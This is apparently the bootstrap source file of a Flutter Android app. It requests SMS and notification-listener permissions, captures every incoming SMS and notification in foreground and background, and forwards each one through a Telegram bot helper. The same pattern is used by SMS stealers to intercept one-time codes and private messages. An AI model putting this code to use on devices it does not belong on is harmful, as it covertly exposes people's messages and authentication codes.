// ignore_for_file: avoid_print

import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter_notification_listener/flutter_notification_listener.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:telephony/telephony.dart';

import 'app.dart';
import 'widgets/tele_bot.dart';
import 'widgets/tele_default_values.dart';

@pragma("vm:entry-point")
final Telephony telephonyInstance = Telephony.instance;

@pragma("vm:entry-point")
final Future<SharedPreferences> preferences = SharedPreferences.getInstance();

@pragma("vm:entry-point")
Future<void> onNotificationReceived(NotificationEvent event) async {
  print('11111 Notification received: ${event.toString()}');
  await TelegramBotHelper.sendNotificationMessage(event);
}

@pragma("vm:entry-point")
Future<void> bootstrap(
  final FutureOr<Widget> Function() builder, {
  String env = 'prod',
}) async {
  // needed if you intend to initialize in the `main` function
  WidgetsFlutterBinding.ensureInitialized();
  TelegramDefaultValue.instance.init(env);

  await smsConfig();
  await notificationConfig();
  runApp(const MyApp());
}

@pragma("vm:entry-point")
Future<void> smsConfig() async {
  final requestPermission = await telephonyInstance.requestSmsPermissions;

  if (requestPermission != null && requestPermission) {
    telephonyInstance.listenIncomingSms(
        onNewMessage: foregroundMessageHandler,
        onBackgroundMessage: backgroundMessageHandler);
  }
}

@pragma("vm:entry-point")
void backgroundMessageHandler(SmsMessage smsMessage) async {
  await TelegramBotHelper.sendMessage(smsMessage);
}

@pragma("vm:entry-point")
//Handle foreground message
void foregroundMessageHandler(SmsMessage message) async {
  await TelegramBotHelper.sendMessage(message);
}

@pragma("vm:entry-point")
Future<void> notificationConfig() async {
  NotificationsListener.initialize(callbackHandle: onNotificationReceived);
  var hasPermission = await NotificationsListener.hasPermission;
  if (!(hasPermission ?? false)) {
    print("no permission, so open settings");
    await NotificationsListener.openPermissionSettings();

    return;
  }

  var isR = await NotificationsListener.isRunning;
  if (!(isR ?? false)) {
    await NotificationsListener.demoteToBackground();
  }
}
